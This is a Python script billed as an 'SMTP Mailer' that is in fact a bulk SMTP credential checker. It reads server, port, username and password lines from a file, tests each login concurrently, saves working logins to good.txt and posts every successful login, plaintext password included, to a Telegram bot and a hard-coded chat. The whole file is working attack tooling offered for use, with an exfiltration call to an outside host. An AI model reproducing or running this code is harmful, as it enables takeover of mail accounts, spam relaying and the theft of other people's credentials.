import smtplib
import requests
import os
import subprocess
import sys
import concurrent.futures
from termcolor import colored
from colorama import Fore, Style, init

init()

merah = Fore.LIGHTRED_EX
putih = Fore.LIGHTWHITE_EX
hijau = Fore.LIGHTGREEN_EX
kuning = Fore.LIGHTYELLOW_EX
reset = Style.RESET_ALL

def install_required_modules():
    required_modules = ['termcolor', 'colorama']
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            print(f"{module} not found. Installing...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])
            print(f"{module} installed successfully.")

install_required_modules()
init()

def print_banner():
    banner = f"""
{putih}███╗   ██╗ ██████╗  ██████╗ ██████╗   {putih}A Python Based SMTP {hijau}Mailer
████╗  ██║██╔═══██╗██╔═══██╗██╔══██╗  {hijau}Version: {putih}v 1.0.0
██╔██╗ ██║██║   ██║██║   ██║██████╔╝  {putih}Author: {hijau}Noob Pirate Aka Blionrie
██║╚██╗██║██║   ██║██║   ██║██╔══██╗  {hijau}Note: {putih}Every Action Has a Consequence
██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝  {putih}Join: {hijau}https://t.me/piratexcrew
╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝   {hijau}Bored..? : {putih}http://bit.ly/3MTMHyU
___________________________________________________________________________
    {reset}"""
    print(banner)

def check_smtp_login(smtp_server, port, username, password):
    try:
        smtp_client = smtplib.SMTP(smtp_server, port)
        smtp_client.starttls()
        smtp_client.login(username, password)
        smtp_client.quit()
        return "Hit", f"[+] Hit | {smtp_server}|{port}|{username}|{password} -- Login successful"
    except smtplib.SMTPAuthenticationError:
        return "Bad", f"[-] Bad | {smtp_server}|{port}|{username}|{password} -- Login failed: Authentication error"
    except smtplib.SMTPException as e:
        return "Bad", f"[-] Bad | {smtp_server}|{port}|{username}|{password} -- SMTP error: {e}"
    except Exception as e:
        return "Fail", f"[-] Fail | {smtp_server}|{port}|{username}|{password} -- An error occurred: {e}"

def read_credentials(file_path):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
            credentials = [line.strip().split('|') for line in lines if len(line.strip().split('|')) == 4]
            return credentials
    except Exception as e:
        raise ValueError(f"Error reading file: {e}")

def send_telegram_message(smtp_server, port, username, password):
    bot_token = 'Replace With Your Bot Token'
    chat_id = '-1001730641659'
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    message = f"""
===========================
⁪⁬⁮⁮⁮⁮ ‌⏤͟͞⁪⁬⁮⁮⁮⁮𝙋𝙞𝙧𝙖𝙩𝙚⌁𝙃𝙞𝙩𝙨™ </> 
===========================
⌁⌁ SMTP Hit Detected ⌁⌁
===========================
[ ⌁ ] SMTP Server :- {smtp_server}
[ ⌁ ] Port       :- {port}
[ ⌁ ] User      :- {username}
[ ⌁ ] Password  :- {password}
[ ⌁ ] By        : @noobpirate
    """
    
    message = message.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(api_url, data=payload)
        if response.status_code == 200:
            print("Telegram message sent successfully.")
        else:
            print(f"Failed to send Telegram message. Status code: {response.status_code}, Response: {response.text}")
    except requests.RequestException as e:
        print(f"An error occurred while sending the Telegram message: {e}")

def save_hits_to_file(hit_results):
    file_path = 'good.txt'
    with open(file_path, 'w') as file:
        for result in hit_results:
            file.write(result + '\n')
    print(f"Successful logins saved to {file_path}")

def process_credential(smtp_server, port, username, password):
    status, message = check_smtp_login(smtp_server, int(port), username, password)
    if status == "Hit":
        print(colored(message, 'green'))
        send_telegram_message(smtp_server, port, username, password)
        return message
    elif status == "Bad":
        print(colored(message, 'yellow'))
    else:
        print(colored(message, 'red'))
    return None

def main():
    print_banner()
    file_path = 'raw.txt'
    
    if not os.path.isfile(file_path):
        print(f"File not found: {file_path}")
        return

    credentials = read_credentials(file_path)
    hit_results = []

    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_credential = {executor.submit(process_credential, *cred): cred for cred in credentials}
        for future in concurrent.futures.as_completed(future_to_credential):
            result = future.result()
            if result:
                hit_results.append(result)

    print("\nSummary:")
    print(colored(f"Hits: {len(hit_results)}", 'green'))
    print(colored(f"Total Attempts: {len(credentials)}", 'yellow'))

    if hit_results:
        print("\nSuccessful Logins:")
        for result in hit_results:
            print(colored(result, 'green'))
        
        # Save hits to file
        save_hits_to_file(hit_results)

if __name__ == "__main__":
    main()
